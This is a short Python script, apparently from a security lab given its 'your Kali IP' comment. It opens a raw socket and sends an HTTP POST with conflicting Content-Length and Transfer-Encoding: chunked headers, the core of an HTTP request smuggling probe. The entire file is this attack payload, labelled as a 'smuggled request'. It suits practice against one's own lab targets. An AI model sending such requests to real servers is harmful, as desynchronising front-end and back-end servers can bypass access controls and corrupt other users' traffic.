import socket

target_host = "192.168.75.133"  # Replace with your Kali IP
target_port = 80

payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {target_host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
)

print("[*] Sending smuggled request...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))
s.send(payload.encode())
s.close()
print("[+] Payload sent.")
